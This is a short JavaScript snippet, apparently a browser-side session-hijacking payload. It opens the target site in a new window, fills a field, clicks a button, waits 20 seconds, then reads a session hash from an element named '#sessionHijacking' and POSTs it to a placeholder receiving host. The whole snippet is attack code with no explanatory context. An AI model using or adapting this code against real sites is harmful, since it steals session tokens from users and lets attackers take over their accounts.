var gotYou = true;
var newWin;
if ( window.location.href == 'target_site') {
    newWin = window.open("target_site");
    newWin.onload = function () {
        newWin.document.querySelector('#sessionHijack').value = 'user';
        var buttons = newWin.document.getElementsByTagName('button');
        buttons[4].click();

        var delayInMilliseconds = 20000;

        setTimeout(function() {
            var hashValue = newWin.document.querySelector('#sessionHijacking').innerHTML;
            
            fetch('receive_site_url', {
                method: 'POST',
                body: hashValue
            })
                .then(response => response.json())
                .then(console.log)

        }, delayInMilliseconds);

        }
}